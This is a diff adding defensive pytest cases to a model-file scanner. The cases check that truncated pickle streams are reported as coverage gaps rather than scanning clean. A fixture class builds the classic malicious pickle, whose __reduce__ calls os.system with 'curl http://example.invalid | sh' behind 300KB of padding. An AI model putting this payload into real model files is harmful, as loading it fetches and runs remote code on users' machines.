@@ -33,7 +33,7 @@ from pathlib import Path
 import pytest
 
 from hayward import scanner as mfv_scanner
-from hayward.findings import Severity
+from hayward.findings import Severity, is_coverage_gap
 from hayward.scanner import ModelFileScanner, _resolve_pickle_globals
 
 
@@ -131,6 +131,107 @@ class TestMultiPickleStreamWalk:
         _globals, resolved_calls, _memo = _resolve_pickle_globals(data)
         calls = [c for c in resolved_calls if c.ref == "os.system"]
         assert calls and calls[0].args == ("clean",)
+
+
+class _RunsShell:
+    """Pickles to `os.system('curl ... | sh')`, the standard REDUCE payload."""
+
+    def __reduce__(self):
+        return (os.system, ("curl http://example.invalid | sh",))
+
+
+class TestTruncatedPickleReportsCoverage:
+    """A pickle that never reaches its STOP opcode was not read to the end,
+    and whatever sat past the cut was never examined. The scanner reported
+    nothing at all for one: a 300KB pickle whose `os.system` call sat behind
+    the padding was CRITICAL whole and *silent* cut in half, which is the
+    "Art of Hide and Seek" shape (arXiv 2508.19774) reached by nothing more
+    than a partial download. Silence there also blocks scanning a remote
+    checkpoint through HTTP range requests, since a prefix cannot be trusted
+    without a termination check.
+    """
+
+    def _padded_payload(self) -> bytes:
+        """A pickle whose os.system call sits behind 300KB of padding."""
+        return pickle.dumps(
+            {"padding": "x" * 300_000, "evil": _RunsShell()}, protocol=4,
+        )
+
+    def test_whole_file_is_critical(self, tmp_path):
+        """The premise: cut nothing and the payload is found."""
+        p = tmp_path / "full.pt"
+        p.write_bytes(self._padded_payload())
+
+        findings = ModelFileScanner().scan_file(p)
+        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)
+        assert not any(f.rule_id == "MFV-SKIP-003" for f in findings)
+
+    def test_truncated_mid_opcode_reports_a_coverage_gap(self, tmp_path):
+        """Cut inside the padding string's argument, so the parse asks for
+        more bytes than remain."""
+        p = tmp_path / "cut.pt"
+        p.write_bytes(self._padded_payload()[:150_000])
+
+        findings = ModelFileScanner().scan_file(p)
+        skips = [f for f in findings if f.rule_id == "MFV-SKIP-003"]
+        assert skips, (
+            f"truncated pickle hiding os.system past the cut scanned clean: "
+            f"{[f.rule_id for f in findings]}"
+        )
+        assert is_coverage_gap(skips[0])
+        assert skips[0].metadata["skipped_reason"] == "pickle_truncated"
+
+    def test_ran_out_before_stop_reports_a_coverage_gap(self, tmp_path):
+        """Cut on an opcode boundary instead, so the parse ends tidily with
+        the STOP simply never arriving. No exception is raised, which is the
+        quieter half of the same gap."""
+        p = tmp_path / "no_stop.pkl"
+        p.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)[:-1])
+
+        findings = ModelFileScanner().scan_file(p)
+        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
+            f"pickle missing its STOP opcode scanned clean: "
+            f"{[f.rule_id for f in findings]}"
+        )
+
+    def test_complete_legacy_torch_file_is_not_flagged(self, tmp_path):
+        """The legacy layout ends its four pickles and then writes raw tensor
+        storage. Storage is not a truncated stream, and calling it one would
+        put a coverage gap on every legacy checkpoint there is."""
+        p = tmp_path / "legacy.pt"
+        p.write_bytes(
+            _legacy_torch_layout(pickle.dumps({"w": [1.0, 2.0]}, protocol=2))
+            + b"\x00\x01\x02RAW-TENSOR-BYTES\xff"
+        )
+
+        findings = ModelFileScanner().scan_file(p)
+        assert not any(f.rule_id == "MFV-SKIP-003" for f in findings), (
+            f"complete legacy checkpoint reported as truncated: "
+            f"{[f.rule_id for f in findings]}"
+        )
+
+    def test_legacy_torch_truncated_in_its_last_pickle_is_flagged(self, tmp_path):
+        """The three header pickles terminate, so a check that only asked
+        "did anything reach STOP" would miss this. The state_dict pickle is
+        the one that got cut."""
+        p = tmp_path / "legacy_cut.pt"
+        p.write_bytes(
+            _legacy_torch_layout(pickle.dumps({"w": "y" * 5_000}, protocol=2))[:-3_000]
+        )
+
+        findings = ModelFileScanner().scan_file(p)
+        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
+            f"legacy checkpoint cut inside its state_dict scanned clean: "
+            f"{[f.rule_id for f in findings]}"
+        )
+
+    def test_non_pickle_bytes_stay_silent(self, tmp_path):
+        """Raw float data trips the two-byte opener sniff constantly, and it
+        dies on an unreadable opcode with bytes to spare rather than running
+        off the end. That is unparseable content, not a short file, and it
+        must stay silent or every torch checkpoint grows a coverage gap."""
+        assert not mfv_scanner._pickle_stream_truncated(struct.pack("<512d", *([1.5] * 512)))
+        assert not mfv_scanner._pickle_stream_truncated(b"\x80\x04" + os.urandom(4096))
 
 
 class TestStackDesyncViaUnsimulatedPushes:
